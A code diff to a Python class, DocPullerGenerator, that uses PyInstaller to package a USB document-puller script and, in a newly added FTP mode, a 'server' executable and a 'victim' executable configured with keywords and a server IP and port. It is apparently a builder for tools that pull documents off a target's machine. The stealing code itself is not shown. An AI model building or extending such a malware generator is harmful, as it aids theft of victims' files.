@@ -14,7 +14,9 @@ class DocPullerGenerator:
         self.keywords = keywords
         self.server_ip = server_ip
         self.server_port = server_port
-        self.DOCPULLER_SCRIPT = 'Generator/docpullerscrip.py'
+        self.DOCPULLER_USB_PATH = 'Generator/docpullerscrip.py'
+        self.DOCPULLER_FTP_SERVER_PATH = 'Generator/serverscrip.py'
+        self.DOCPULLER_FTP_CLIENT_PATH = 'Generator/victimscrip.py'
 
         # Specify additional PyInstaller options if needed
         self.options = [
@@ -30,8 +32,27 @@ class DocPullerGenerator:
         if self.is_usb:
             print('genarating exe')
 
-            command = ["pyinstaller",'--console','--onefile',f"--distpath={self.save_dir}",self.DOCPULLER_SCRIPT]
-            nig=subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-                             universal_newlines=True)
+            command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}", self.DOCPULLER_USB_PATH]
+            nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                   universal_newlines=True)
             nig.communicate()
-            print(nig)
+            print('done!')
+
+        else:
+            print('genarating server exe')
+
+            command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}",
+                       self.DOCPULLER_FTP_SERVER_PATH]
+            nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                   universal_newlines=True)
+            nig.communicate()
+
+            print('genarating victim exe')
+
+            command = ["pyinstaller", '--console', '--onefile', f"--distpath={self.save_dir}",
+                       self.DOCPULLER_FTP_CLIENT_PATH]
+            nig = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                                   universal_newlines=True)
+            nig.communicate()
+
+            print('Done!')
